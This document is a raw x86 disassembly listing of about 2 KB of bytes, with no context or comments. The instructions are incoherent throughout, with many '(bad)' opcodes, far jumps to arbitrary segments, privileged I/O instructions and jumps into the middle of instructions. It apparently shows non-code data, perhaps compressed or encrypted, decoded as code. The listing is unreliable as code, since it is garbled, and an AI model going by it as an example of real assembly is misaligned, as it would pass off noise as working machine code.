  4061ca:	add    eax,0x1324ea1c
  4061cf:	sub    BYTE PTR [ebx],0xac
  4061d2:	outs   dx,DWORD PTR ds:[esi]
  4061d3:	jl     0x4061af
  4061d5:	or     DWORD PTR [bx+si+0x5a8e],ebp
  4061da:	jecxz  0x40619b
  4061dc:	mov    cl,0x29
  4061de:	mov    BYTE PTR [esi+0x2d53de6e],ch
  4061e4:	loop   0x4061dc
  4061e6:	cmp    ebx,DWORD PTR [ebp-0x6e]
  4061e9:	sti    
  4061ea:	jp     0x406256
  4061ec:	call   0x893b:0x1e6015c3
  4061f3:	arpl   WORD PTR [esi+0x77bacfdf],cx
  4061f9:	fild   QWORD PTR [ebp-0x2f25d7db]
  4061ff:	aad    0x4e
  406201:	(bad)  
  406202:	shl    DWORD PTR [ebx-0x7a2455f0],1
  406208:	add    dh,ch
  40620a:	push   edx
  40620b:	and    ebp,DWORD PTR [edx*4-0x32de9f31]
  406212:	mov    edi,0x3d767f02
  406217:	or     DWORD PTR [esi+esi*1-0x15],eax
  40621b:	inc    edx
  40621c:	mov    ebx,0x89b8bb78
  406222:	mov    ecx,0x47f83e2a
  406227:	jns    0x40625d
  406229:	dec    ebp
  40622a:	add    eax,0xddc22da4
  40622f:	jnp    0x4062a2
  406231:	shl    DWORD PTR [ebx+edx*8+0xb89f299],cl
  406238:	mov    edx,ebx
  40623a:	fwait
  40623b:	rol    BYTE PTR ds:0xbe0b6da1,0x3f
  406242:	enter  0xcac7,0x4f
  406246:	inc    eax
  406247:	fidivr DWORD PTR [edx-0x2f]
  40624a:	jns    0x40623f
  40624c:	jl     0x406298
  40624e:	outs   dx,WORD PTR ds:[esi]
  406250:	jmp    0xeb3626df
  406255:	cdq    
  406256:	repnz fwait
  406258:	aam    0xda
  40625a:	outs   dx,DWORD PTR ds:[esi]
  40625b:	mov    edx,0xc41d2590
  406260:	shl    dh,0x5a
  406263:	fucomip st,st(1)
  406265:	push   esp
  406266:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406267:	sub    BYTE PTR [edx-0x67],dh
  40626a:	sbb    eax,0x2fbb2612
  40626f:	sub    BYTE PTR [esi-0x53],0x92
  406273:	push   es
  406274:	pushf  
  406275:	dec    esp
  406276:	cli    
  406277:	push   edx
  406278:	je     0x4062b7
  40627a:	cmp    al,BYTE PTR [ecx]
  40627c:	push   esi
  40627d:	jne    0x4062f6
  40627f:	pop    ebx
  406280:	xchg   ecx,eax
  406281:	dec    esp
  406282:	in     al,0x28
  406284:	aaa    
  406285:	mov    bl,0x26
  406287:	xchg   esp,eax
  406288:	outs   dx,BYTE PTR ds:[esi]
  406289:	mov    ds:0x28838dfb,eax
  40628e:	add    DWORD PTR [ecx+0x3c],ebx
  406291:	pop    edx
  406292:	shr    BYTE PTR [esi-0x50],0xbc
  406296:	mov    al,ds:0x4480d658
  40629b:	mov    eax,0x1aca97b7
  4062a0:	es shl edx,0x87
  4062a4:	jno    0x4062b3
  4062a6:	mov    BYTE PTR [edi-0x50b8eaf8],dh
  4062ac:	mov    bl,0x55
  4062ae:	into   
  4062af:	popa   
  4062b0:	fdiv   DWORD PTR ds:0x6c62819b
  4062b7:	jl     0x406299
  4062b9:	jnp    0x4062b6
  4062bb:	ret    0xc3bf
  4062be:	push   ebx
  4062bf:	xor    ch,BYTE PTR [ecx+0x2b237086]
  4062c5:	fs push esi
  4062c7:	adc    DWORD PTR [edi-0x2e],ebp
  4062ca:	dec    ebp
  4062cb:	inc    esp
  4062cc:	push   esp
  4062cd:	inc    esi
  4062ce:	call   0x28ef:0x23623e29
  4062d5:	data16 fcmovb st,st(5)
  4062d8:	jne    0x4062e9
  4062da:	pop    ebp
  4062db:	aam    0x7e
  4062dd:	cli    
  4062de:	pop    ecx
  4062df:	gs add al,0x95
  4062e2:	inc    edi
  4062e3:	jp     0x4062d7
  4062e5:	mov    ebp,0x1e1bde4
  4062ea:	(bad)
  4062ee:	int    0x19
  4062f0:	bound  ecx,QWORD PTR [edi]
  4062f2:	inc    ebx
  4062f3:	and    BYTE PTR [ecx],dl
  4062f5:	mov    ds:0x8831496e,eax
  4062fa:	mov    ?,WORD PTR [esi]
  4062fc:	xchg   BYTE PTR [ebx+eax*1+0x1a02320e],dl
  406303:	and    DWORD PTR [edi+0x5aad666d],esi
  406309:	xor    al,bl
  40630b:	loope  0x4062ea
  40630d:	mov    al,ds:0xe58f9907
  406312:	test   BYTE PTR [ecx+0x6ae74651],bl
  406318:	mov    ecx,0x6df5f45e
  40631d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40631e:	mov    ebx,DWORD PTR [eax+0x47333549]
  406324:	(bad)  
  406326:	pop    ebx
  406327:	data16 cli 
  406329:	xchg   ecx,eax
  40632a:	das    
  40632b:	(bad)  
  40632c:	or     ecx,edx
  40632e:	dec    edx
  40632f:	xor    edi,ebx
  406331:	inc    ebx
  406332:	sbb    eax,0x39f33393
  406337:	das    
  406338:	cmc    
  406339:	push   eax
  40633a:	add    ecx,DWORD PTR [ebx+0xb15e40d]
  406340:	jmp    0xf4c7:0x9d41032a
  406347:	adc    al,0xad
  406349:	jmp    0xd98e:0xca1f83d2
  406350:	retf   0xa965
  406353:	hlt    
  406354:	dec    BYTE PTR [edi-0x26]
  406357:	call   0xa0dc:0x8aa41918
  40635e:	fdivr  DWORD PTR [edx-0x48]
  406361:	push   edi
  406362:	nop
  406363:	push   ecx
  406364:	sub    DWORD PTR [ebx-0x65d81b77],0xffffff8a
  40636b:	jmp    0x845171d2
  406370:	out    dx,eax
  406371:	fbstp  TBYTE PTR [ebx+0x48]
  406374:	or     eax,0xbdba4f62
  406379:	adc    eax,esp
  40637b:	sti    
  40637c:	jae    0x4063ab
  40637e:	test   al,0xe0
  406380:	cmp    eax,0xeeb9dc0a
  406385:	(bad)  
  406386:	and    ecx,DWORD PTR [esi]
  406388:	jmp    0x406361
  40638a:	mov    eax,ds:0x3f19f41e
  40638f:	pop    esp
  406390:	enter  0x4a6b,0x2f
  406394:	sti    
  406395:	mov    cl,0x96
  406397:	xchg   esp,eax
  406398:	stos   BYTE PTR es:[edi],al
  406399:	cmc    
  40639a:	xlat   BYTE PTR es:[ebx]
  40639c:	jne    0x40638e
  40639e:	cmp    ebx,DWORD PTR [ecx]
  4063a0:	sub    cl,ch
  4063a2:	inc    edi
  4063a3:	test   DWORD PTR [si+0x36ce],eax
  4063a8:	jo     0x4063a9
  4063aa:	pop    esi
  4063ab:	popa   
  4063ac:	cmp    edi,edi
  4063ae:	xchg   DWORD PTR [eax],edi
  4063b0:	cmp    edi,ebp
  4063b2:	in     eax,0xc2
  4063b4:	(bad)  
  4063b5:	mov    dl,0xa2
  4063b7:	or     BYTE PTR [ecx+0x5c],bl
  4063ba:	push   esp
  4063bb:	mov    bl,BYTE PTR [ebp-0x2d038c86]
  4063c1:	es xor eax,0x99c17f93
  4063c7:	xchg   ebp,eax
  4063c8:	cs addr16 int3 
  4063cb:	cmc    
  4063cc:	ret    
  4063cd:	daa    
  4063ce:	push   eax
  4063cf:	inc    esi
  4063d0:	aas    
  4063d1:	and    eax,0x96f4990a
  4063d6:	xchg   ebp,eax
  4063d7:	inc    BYTE PTR [esi-0x3bcd79b8]
  4063dd:	pushf  
  4063de:	cmp    eax,0xfd1e75a2
  4063e3:	aaa    
  4063e4:	loop   0x406397
  4063e6:	dec    edx
  4063e7:	imul   esp,esp,0xffffffeb
  4063ea:	imul   edi,DWORD PTR [edx+0x15c48f31],0x2e
  4063f1:	ror    BYTE PTR [ebx],1
  4063f3:	nop
  4063f4:	les    ebx,FWORD PTR [edx]
  4063f6:	js     0x4063cc
  4063f8:	int    0x1f
  4063fa:	sub    esi,DWORD PTR [edi]
  4063fc:	mov    ds:0x773bb1f9,eax
  406401:	pop    ebx
  406402:	sahf   
  406403:	pop    eax
  406404:	mov    ah,al
  406406:	push   esp
  406407:	gs test al,0xe6
  40640a:	(bad)  
  40640b:	sar    BYTE PTR [edx-0xc50e40b],cl
  406411:	js     0x4063ac
  406413:	cwde   
  406414:	popf   
  406415:	sub    ch,cl
  406417:	xor    DWORD PTR [edx+0x15],eax
  40641a:	ja     0x406493
  40641c:	fnstsw WORD PTR [edi]
  40641e:	test   al,0x2b
  406420:	sub    al,0x91
  406422:	ja     0x4063d7
  406424:	mov    esp,0x44c1724b
  406429:	hlt    
  40642a:	cmp    cl,ch
  40642c:	push   ebp
  40642d:	xchg   esp,eax
  40642e:	inc    esi
  40642f:	mov    ds:0x359ece95,eax
  406434:	adc    eax,0xad372241
  406439:	lods   eax,DWORD PTR ds:[esi]
  40643a:	in     eax,dx
  40643b:	sub    BYTE PTR ds:0x5d925de6,0x88
  406442:	ja     0x40647a
  406444:	pop    ebp
  406445:	sbb    DWORD PTR [eax-0x56],ebp
  406448:	push   ecx
  406449:	popa   
  40644a:	gs repz addr16 add eax,0x58eafb96
  406452:	mov    eax,0xe1f8e8a
  406457:	scas   eax,DWORD PTR es:[edi]
  406458:	sbb    eax,0xb026ac21
  40645d:	xor    eax,0x88ea8133
  406462:	jmp    0x69ad:0xcc0f6fa7
  406469:	cli    
  40646a:	dec    ebx
  40646b:	mov    eax,ds:0x7487fab0
  406470:	push   eax
  406471:	sbb    dl,dl
  406473:	sbb    eax,0x9ba5663b
  406478:	into   
  406479:	xchg   ecx,eax
  40647a:	loop   0x40648f
  40647c:	xor    ch,ah
  40647e:	and    edi,eax
  406480:	pop    esi
  406481:	mov    esp,0x4ff501be
  406486:	xchg   esp,eax
  406487:	or     al,0x43
  406489:	mov    al,ds:0x8eb92ea8
  40648e:	sbb    BYTE PTR [edx-0x12],dh
  406491:	pop    ss
  406492:	push   esp
  406493:	mov    cl,0x0
  406495:	mov    eax,ds:0x5d77955b
  40649a:	jmp    0xf778:0x21e4eed9
  4064a1:	inc    ebp
  4064a2:	xor    al,0x61
  4064a4:	inc    ecx
  4064a5:	cmp    al,0xee
  4064a7:	xor    dl,ah
  4064a9:	and    al,0x46
  4064ab:	(bad)  [edx]
  4064ad:	jno    0x40650d
  4064af:	xchg   ebx,eax
  4064b0:	push   eax
  4064b1:	mov    esp,0xb45cae20
  4064b6:	repnz int 0x98
  4064b9:	sbb    eax,edx
  4064bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064bc:	retf   0x8830
  4064bf:	addr16 xchg esp,eax
  4064c1:	(bad)  
  4064c2:	fsub   QWORD PTR [ecx]
  4064c4:	and    eax,0x97c28aef
  4064c9:	popf   
  4064ca:	int    0xf2
  4064cc:	mov    BYTE PTR [ebx-0x112839bd],al
  4064d2:	jbe    0x4064bc
  4064d4:	push   es
  4064d5:	push   edi
  4064d6:	jne    0x4064e5
  4064d8:	push   eax
  4064d9:	(bad)  
  4064da:	(bad)  
  4064db:	nop
  4064dc:	loop   0x406482
  4064de:	cmp    DWORD PTR [ebx],eax
  4064e0:	push   cs
  4064e1:	mov    edi,0x29266c1
  4064e6:	mov    ss,WORD PTR [ecx+0x5]
  4064e9:	mov    edi,0xe2a3410d
  4064ee:	pop    ss
  4064ef:	ins    BYTE PTR es:[edi],dx
  4064f0:	in     eax,0xfa
  4064f2:	test   BYTE PTR [edx+edi*4],bh
  4064f5:	cmp    al,0xcc
  4064f7:	sbb    ebp,esp
  4064f9:	fsubr  st(5),st
  4064fb:	jmp    0x406572
  4064fd:	adc    DWORD PTR [ebx+0x41],ebp
  406500:	pusha  
  406501:	out    0x53,eax
  406503:	adc    DWORD PTR [eax+0x7b],0x7c34349b
  40650a:	dec    edi
  40650b:	rcr    BYTE PTR ds:[ebx-0x3e98ef20],0xe6
  406513:	repnz sbb ah,BYTE PTR [edi+0x72]
  406517:	and    DWORD PTR [esi+eax*2+0x695813b],eax
  40651e:	lods   al,BYTE PTR ds:[esi]
  40651f:	imul   BYTE PTR [eax+0x40a7ce2]
  406525:	or     eax,0x8eb0c25c
  40652a:	adc    BYTE PTR [edi+0x59],dl
  40652d:	xchg   edi,eax
  40652e:	sbb    eax,0xabbe63d
  406533:	lea    edx,[edx-0x8]
  406536:	cmp    BYTE PTR [edi+0x5ecd4622],bh
  40653c:	ror    ebp,0x99
  40653f:	mov    esp,0x4792dcbb
  406544:	and    al,0x1a
  406546:	adc    ebp,ebp
  406548:	xor    edi,esp
  40654a:	fst    QWORD PTR [ecx]
  40654c:	adc    esi,DWORD PTR [ecx-0x5d]
  40654f:	in     eax,dx
  406550:	(bad)  
  406551:	sub    al,0x7b
  406553:	lock call 0xc4c5:0x1781a6d7
  40655b:	pop    esi
  40655c:	outs   dx,DWORD PTR gs:[esi]
  40655e:	adc    DWORD PTR [ebp+0x18],edx
  406561:	outs   dx,BYTE PTR ds:[esi]
  406562:	xchg   ecx,eax
  406563:	xor    ch,BYTE PTR [esi+ebp*1+0x4f9f8469]
  40656a:	pop    edi
  40656b:	(bad)  
  40656c:	in     eax,0x80
  40656e:	inc    eax
  40656f:	adc    BYTE PTR [ebx+0x69],ah
  406572:	daa    
  406573:	mov    eax,ds:0x2899dd43
  406578:	push   0xab3dcd76
  40657d:	dec    edx
  40657e:	dec    edi
  40657f:	aas    
  406580:	enter  0x2c51,0xc1
  406584:	ds ja  0x406515
  406587:	mov    eax,DWORD PTR [edx+0x4e8c3378]
  40658d:	xor    ecx,DWORD PTR [ecx]
  40658f:	nop
  406590:	mov    bl,BYTE PTR [ebp+0x4ea4c246]
  406596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406597:	inc    ebp
  406598:	cld    
  406599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40659a:	xor    BYTE PTR [edi+edx*4],ah
  40659d:	(bad)  
  40659e:	stos   BYTE PTR es:[edi],al
  40659f:	add    edx,edi
  4065a1:	jb     0x406542
  4065a3:	or     DWORD PTR [ebx],0xffffffec
  4065a6:	mov    fs,WORD PTR [esi+0x5ea5ba17]
  4065ac:	inc    edi
  4065ad:	dec    esi
  4065ae:	adc    edx,DWORD PTR [eax-0x106ea610]
  4065b4:	mov    bl,0xcd
  4065b6:	pop    ss
  4065b7:	pop    esi
  4065b8:	pop    ecx
  4065b9:	sub    al,0x41
  4065bb:	aaa    
  4065bc:	push   ebp
  4065bd:	pop    ecx
  4065be:	adc    al,0xfa
  4065c0:	test   eax,ebx
  4065c2:	cmp    ecx,0xae544d34
  4065c8:	enter  0x4665,0x9c
  4065cc:	ja     0x406622
  4065ce:	not    eax
  4065d0:	xchg   edx,eax
  4065d1:	add    BYTE PTR [edx+ebx*1-0x358675d8],bl
  4065d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065d9:	inc    edi
  4065da:	fild   WORD PTR [esi-0x551a9881]
  4065e0:	sub    al,0x72
  4065e2:	mov    ebp,DWORD PTR ds:0x559148bf
  4065e8:	repz mov edi,0xf3a95141
  4065ee:	sub    DWORD PTR [edi+edx*8],0x29bda494
  4065f5:	dec    BYTE PTR [edi-0x2be46bde]
  4065fb:	movups xmm7,XMMWORD PTR [ecx+0x4087cdb8]
  406602:	ds aam 0xe4
  406605:	call   0x8d468855
  40660a:	ficom  WORD PTR [ebp+ebp*4-0x2c]
  40660e:	repnz iret 
  406610:	test   DWORD PTR [ebp+0x35c9b869],0xd3a82e82
  40661a:	call   0x285e:0x9b58eab4
  406621:	xor    BYTE PTR [ebp+0xcb58000],bl
  406627:	sub    ah,BYTE PTR [ecx]
  406629:	sahf   
  40662a:	cmp    BYTE PTR [ebp-0x6f],dh
  40662d:	add    DWORD PTR ss:[ebp+0x46],edi
  406631:	and    DWORD PTR [ecx-0x68106936],esp
  406637:	push   eax
  406638:	pop    ebx
  406639:	jae    0x4065f2
  40663b:	in     eax,dx
  40663c:	jns    0x40664e
  40663e:	mov    fs,WORD PTR [eax]
  406640:	test   al,0xcd
  406642:	xlat   BYTE PTR ds:[ebx]
  406643:	and    DWORD PTR [esi],edx
  406645:	(bad)  
  406647:	call   0x94fc:0x45efde70
  40664e:	out    0x1d,al
  406650:	shr    esp,0x96
  406653:	or     edx,DWORD PTR [ebp+0xe]
  406656:	mov    eax,0xad69dfa0
  40665b:	mov    eax,ds:0x2f73950e
  406660:	mov    esp,0xc52bb471
  406665:	ss lock iret 
  406668:	ja     0x4066ce
  40666a:	adc    al,BYTE PTR [eax+0x6b]
  40666d:	je     0x4065f0
  40666f:	das    
  406670:	fisttp QWORD PTR [ebp+0x38aa662b]
  406676:	cmc    
  406677:	aaa    
  406678:	mov    dl,0x2a
  40667a:	stos   DWORD PTR es:[edi],eax
  40667b:	and    bh,dh
  40667d:	mov    bl,0xb4
  40667f:	lock (bad) 
  406681:	icebp  
  406682:	sti    
  406683:	mov    eax,ds:0xf4ad8b0d
  406688:	lds    edx,FWORD PTR [ebx+0x5c]
  40668b:	imul   ecx,DWORD PTR ds:0xf70f3a77,0xffffffcf
  406692:	jle    0x4066d0
  406694:	dec    esp
  406695:	bound  edx,QWORD PTR [ebp-0x3e]
  406698:	in     al,dx
  406699:	xchg   esp,eax
  40669a:	adc    BYTE PTR [ebp+0x25aa48b5],dl
  4066a0:	xchg   esi,eax
  4066a1:	ja     0x406686
  4066a3:	das    
  4066a4:	push   cs
  4066a5:	sub    eax,DWORD PTR [edi+0x1d]
  4066a8:	jb     0x40671a
  4066aa:	adc    eax,0x1eb5fb0c
  4066af:	repz and ecx,DWORD PTR [ebp-0xf]
  4066b3:	pusha  
  4066b4:	shr    al,0x23
  4066b7:	mov    esp,0x559aeb2f
  4066bc:	dec    ebp
  4066bd:	repz mov al,0x54
  4066c0:	or     eax,0x91879ad6
  4066c5:	fisttp QWORD PTR [esi]
  4066c7:	fisub  WORD PTR [edi]
  4066c9:	out    0x12,eax
  4066cb:	adc    ecx,edi
  4066cd:	in     eax,0x80
  4066cf:	jle    0x406685
  4066d1:	mov    esi,0xc3082915
  4066d6:	jbe    0x406717
  4066d8:	addr16 mov eax,cs
  4066db:	popf   
  4066dc:	retf   
  4066dd:	out    0x22,al
  4066df:	inc    ebx
  4066e0:	sub    bl,al
  4066e2:	xor    eax,0xf4c83c05
  4066e7:	and    dh,BYTE PTR [edx+0x4eb0d981]
  4066ed:	div    DWORD PTR [esi-0x16]
  4066f0:	mov    bh,0xad
  4066f2:	aam    0xe9
  4066f4:	or     BYTE PTR [esi],bh
  4066f6:	sbb    DWORD PTR [edi+0x7d],edi
  4066f9:	xchg   edx,eax
  4066fa:	mov    ds:0x9b2702a3,eax
  4066ff:	or     eax,0x326415f
  406704:	mov    edx,0x99e4f15c
  406709:	jg     0x406780
  40670b:	(bad)  [ebx]
  40670d:	jmp    0x406722
  40670f:	ins    BYTE PTR es:[edi],dx
  406710:	jg     0x406759
  406712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406713:	sti    
  406714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406715:	or     al,0xa1
  406717:	dec    ebx
  406718:	inc    eax
  406719:	sbb    dh,BYTE PTR [ecx]
  40671b:	loopne 0x4066f7
  40671d:	pop    esp
  40671e:	mov    al,ds:0xd3e7ffbc
  406723:	lods   al,BYTE PTR ds:[esi]
  406724:	mov    DWORD PTR [ecx],eax
  406726:	ins    BYTE PTR es:[edi],dx
  406727:	adc    al,0xee
  406729:	daa    
  40672a:	popa   
  40672b:	and    DWORD PTR [ebx],ecx
  40672d:	mov    ebp,0xcce280b8
  406732:	push   cs
  406733:	lahf   
  406734:	in     eax,0x28
  406736:	mov    ch,0xa0
  406738:	imul   ebp,DWORD PTR [ebx],0x63c44ef9
  40673e:	inc    esi
  40673f:	fst    DWORD PTR [eax-0x28]
  406742:	int3   
  406743:	mov    ebp,0xb80b8bd7
  406748:	jmp    0x406761
  40674a:	push   ecx
  40674b:	outs   dx,DWORD PTR ds:[esi]
  40674c:	adc    edi,esp
  40674e:	pop    ecx
  40674f:	fadd   DWORD PTR [edi]
  406751:	sub    esp,DWORD PTR [ebp+0x43]
  406754:	push   edi
  406755:	shl    bl,cl
  406757:	test   al,0x3f
  406759:	fdivp  st(1),st
  40675b:	jae    0x4067c8
  40675d:	push   edi
  40675e:	out    0xa5,eax
  406760:	add    al,0x7a
  406762:	out    0x4c,al
  406764:	cli    
  406765:	push   eax
  406766:	out    dx,al
  406767:	mov    bh,0x4c
  406769:	cmp    al,0xe8
  40676b:	retf   
  40676c:	mov    esi,0x1768a1ac
  406771:	xchg   esi,eax
  406772:	jmp    0xbde3:0x6c0d00aa
  406779:	jae    0x4067cb
  40677b:	popf   
  40677c:	lahf   
  40677d:	ror    bl,cl
  40677f:	sub    al,0xca
  406781:	or     dh,BYTE PTR [ecx]
  406783:	push   cs
  406784:	inc    esp
  406785:	fisttp QWORD PTR [ecx]
  406787:	outs   dx,BYTE PTR ds:[esi]
  406788:	(bad)  
  406789:	lods   eax,DWORD PTR ds:[esi]
  40678a:	aam    0xa2
  40678c:	arpl   WORD PTR gs:[edi],bp
  40678f:	popa   
  406790:	mov    cl,0xe9
  406792:	fist   WORD PTR ds:0x54214052
  406798:	push   edi
  406799:	push   es
  40679a:	aas    
  40679b:	mov    dh,bh
  40679d:	add    BYTE PTR [ecx+0x1a820862],0x1d
  4067a4:	and    bl,bh
  4067a6:	into   
  4067a7:	outs   dx,BYTE PTR ds:[esi]
  4067a8:	in     al,dx
  4067a9:	mov    ah,0x74
  4067ab:	les    ebp,FWORD PTR [ebx-0x7b]
  4067ae:	add    esi,DWORD PTR [eax]
  4067b0:	(bad)  
  4067b2:	add    al,0x9c
  4067b4:	test   al,0xac
  4067b6:	and    eax,0x59de4323
  4067bb:	mov    esi,ds
  4067bd:	mov    bl,0x11
  4067bf:	mov    edx,0x510ca5da
  4067c4:	mov    edx,0xabd7bc27
  4067c9:	std    
  4067ca:	ret    
  4067cb:	mov    al,0x41
  4067cd:	cmp    edx,DWORD PTR [ecx+0x7a]
  4067d0:	not    DWORD PTR [esi+0x42]
  4067d3:	push   esp
  4067d4:	add    al,0x50
  4067d6:	call   FWORD PTR [eax+0xe]
  4067d9:	cmp    al,0x95
  4067db:	xor    edi,0xa2fa855f
  4067e1:	push   0xc757f406
  4067e6:	les    esi,FWORD PTR [eax+0x66ce34a6]
  4067ec:	mov    ecx,0x575ebffd
  4067f1:	das    
  4067f2:	cmc    
  4067f3:	xchg   edi,eax
  4067f4:	inc    ebp
  4067f5:	out    0xa,al
  4067f7:	push   edi
  4067f8:	(bad)
  4067fb:	cwde   
  4067fc:	cli    
  4067fd:	mov    dh,0xef
  4067ff:	xlat   BYTE PTR ds:[ebx]
  406800:	sbb    al,0x23
  406802:	push   eax
  406803:	not    al
  406805:	lock ins DWORD PTR es:[edi],dx
  406807:	cmc    
  406808:	jmp    FWORD PTR [ecx+eax*8-0x20615026]
  40680f:	jno    0x40680e
  406811:	xor    DWORD PTR [ebx+edx*1+0x26],eax
  406815:	(bad)  
  406816:	into   
  406817:	ja     0x4067d2
  406819:	fisttp DWORD PTR [esi+ebx*1]
  40681c:	fld    QWORD PTR [edi+0x55]
  40681f:	dec    ebp
  406820:	mov    dh,cl
  406822:	(bad)  
  406823:	push   cs
  406824:	pop    edx
  406825:	shr    DWORD PTR [eax+0x7c2d6154],cl
  40682b:	inc    esi
  40682c:	dec    eax
  40682d:	stos   BYTE PTR es:[edi],al
  40682e:	call   0xced489f8
  406833:	xchg   ebx,eax
  406834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406835:	mov    al,cl
  406837:	add    BYTE PTR [ebx],bl
  406839:	cld    
  40683a:	mov    cl,0x6f
  40683c:	in     al,dx
  40683d:	ss ds retf 0x1a05
  406842:	int    0xe5
  406844:	jbe    0x406818
  406846:	(bad)  
  406848:	out    0x43,al
  40684a:	and    al,0x8c
  40684c:	sub    al,0x9c
  40684e:	cli    
  40684f:	push   0xffffffb4
  406851:	jecxz  0x406844
  406853:	inc    edi
  406854:	idiv   DWORD PTR ds:0xc61e700
  40685a:	out    dx,eax
  40685b:	lods   al,BYTE PTR ds:[esi]
  40685c:	mov    ds:0x7abc341b,al
  406861:	outs   dx,DWORD PTR ds:[esi]
  406862:	dec    ebx
  406863:	ins    BYTE PTR es:[edi],dx
  406864:	sub    DWORD PTR ds:0x631c9cd3,eax
  40686a:	cmp    al,0x5a
  40686c:	sbb    DWORD PTR [ecx],edi
  40686e:	aaa    
  40686f:	push   edx
  406870:	in     al,dx
  406871:	adc    al,0x9b
  406873:	idiv   DWORD PTR [esi-0x3e]
  406876:	mov    BYTE PTR [edi+edx*8-0x2d],al
  40687a:	retf   
  40687b:	inc    ebp
  40687c:	ins    DWORD PTR es:[di],dx
  40687e:	fistp  DWORD PTR [ebx]
  406880:	inc    edx
  406881:	and    BYTE PTR [eax],dh
  406883:	sbb    DWORD PTR [ebx],0xffffffb5
  406886:	scas   eax,DWORD PTR es:[edi]
  406887:	pop    esi
  406888:	mov    es,WORD PTR [edx+0x30]
  40688b:	xor    edx,edx
  40688d:	pop    ebx
  40688e:	sbb    eax,0x2a1884be
  406893:	fadd   QWORD PTR [eax]
  406895:	jl     0x4068fd
  406897:	scas   eax,DWORD PTR es:[edi]
  406898:	push   edx
  406899:	(bad)  
  40689a:	cmp    eax,0xfef0789a
  40689f:	dec    esi
  4068a0:	jmp    0x406899
  4068a2:	loopne 0x406915
  4068a4:	pop    ebx
  4068a5:	mov    ds:0x5a37f9d7,al
  4068aa:	fcom   DWORD PTR [esi]
  4068ac:	mov    al,0x3
  4068ae:	dec    ebx
  4068af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068b0:	mov    gs,WORD PTR [ebx+0x3f31d450]
  4068b6:	call   ecx
  4068b8:	mov    DWORD PTR [ebx-0x3d],ebp
  4068bb:	mov    ecx,0xfc95438f
  4068c0:	aam    0xa3
  4068c2:	mov    ?,WORD PTR [edi+edx*8]
  4068c5:	ficom  DWORD PTR [edi-0x68]
  4068c8:	loopne 0x4068ac
  4068ca:	popa   
  4068cb:	(bad)  
  4068cd:	das    
  4068ce:	or     BYTE PTR [esp+esi*4],ah
  4068d1:	xor    eax,0xd399892f
  4068d6:	or     ah,BYTE PTR [esi]
  4068d8:	cmp    eax,0xd151c1af
  4068dd:	xchg   BYTE PTR [esi],cl
  4068df:	mov    ch,0x98
  4068e1:	aam    0x4a
  4068e3:	xchg   edi,eax
  4068e4:	inc    ebp
  4068e5:	adc    eax,0xeb52f383
  4068ea:	es aas 
  4068ec:	rol    BYTE PTR [edx+edx*1],0x31
  4068f0:	or     eax,0xc4bad597
  4068f5:	pop    eax
  4068f6:	ins    BYTE PTR es:[edi],dx
  4068f7:	mov    bh,0x30
  4068f9:	add    al,0xae
  4068fb:	aam    0x19
  4068fd:	std    
  4068fe:	pushf  
  4068ff:	sub    BYTE PTR [eax+edx*1+0x16f55774],cl
  406906:	inc    bh
  406908:	pop    edi
  406909:	xchg   ebp,eax
  40690a:	fbld   TBYTE PTR [esi]
  40690c:	fwait
  40690d:	and    BYTE PTR [ebx+0x48b99879],al
  406913:	jecxz  0x406973
  406915:	sahf   
  406916:	outs   dx,DWORD PTR ds:[esi]
  406917:	push   eax
  406918:	jae    0x406927
  40691a:	sbb    al,0x2c
  40691c:	mov    dl,0x88
  40691e:	mov    DWORD PTR [ebp+0x55],esi
  406921:	pop    di
  406923:	dec    ecx
  406924:	retf   
  406925:	test   DWORD PTR [ecx],ebp
  406927:	push   ebx
  406928:	xchg   ebp,eax
  406929:	fsub   DWORD PTR [eax+eax*4-0x7d]
  40692d:	test   al,0xcd
  40692f:	not    BYTE PTR fs:[ecx]
  406932:	out    0x2b,al
  406934:	jne    0x40696e
  406936:	retf   
  406937:	sub    al,0xcb
  406939:	push   ss
  40693a:	fnstsw WORD PTR ds:0x186cb455
  406940:	dec    ebx
  406941:	mov    ebp,ebp
  406943:	aaa    
  406944:	(bad)  
  406945:	jge    0x40697b
  406947:	cmc    
  406948:	cmp    al,0xd6
  40694a:	cs icebp 
  40694c:	cmp    al,0x15
  40694e:	or     cl,cl
  406950:	cli    
  406951:	jle    0x4069ab
  406953:	jmp    0x25dbbc26
  406958:	ficomp DWORD PTR [edi-0x60]
  40695b:	sub    DWORD PTR [ebx+0x7e],esi
  40695e:	popa   
  40695f:	pushf  
  406960:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406961:	test   BYTE PTR [edi],0xaa
  406964:	inc    esi
  406965:	adc    edi,ebp
  406967:	dec    ecx
  406968:	inc    esi
  406969:	xor    al,0x3b
  40696b:	inc    edx
  40696c:	jnp    0x4069c8
  40696e:	cs out 0xff,al
  406971:	or     ah,dl
  406973:	push   ebx
  406974:	loopne 0x406980
  406976:	xchg   DWORD PTR [edi-0x38],esi
  406979:	jae    0x40697a
  40697b:	shl    BYTE PTR [ecx],cl
  40697d:	push   edx
  40697e:	lods   al,BYTE PTR ds:[esi]
  40697f:	fdiv   QWORD PTR [ecx+0x373f0930]
  406985:	and    al,0xa1
  406987:	jne    0x406971
  406989:	mov    cs:0xe806318b,al
  40698f:	lea    ebp,[edi]
  406991:	leave  
  406992:	pop    esp
  406993:	add    edi,DWORD PTR [eax+ecx*4-0x53]
  406997:	idiv   DWORD PTR [ecx+edi*4-0x1f27fc01]
  40699e:	sub    edx,ebx
  4069a0:	sub    al,0x9f
  4069a2:	(bad)  
  4069a3:	mov    edi,0xdb61b919
  4069a8:	cmp    DWORD PTR [esi+0x350c8467],esp
  4069ae:	or     eax,0x93971add
  4069b3:	xchg   ebp,eax
  4069b4:	rcl    DWORD PTR [edx],1
  4069b6:	jae    0x406a26
  4069b8:	mov    dh,0xc5
  4069ba:	mov    dl,0x38
  4069bc:	or     al,0x2d
  4069be:	fist   DWORD PTR [edx]
  4069c0:	adc    DWORD PTR [ecx],0xf25d30ca
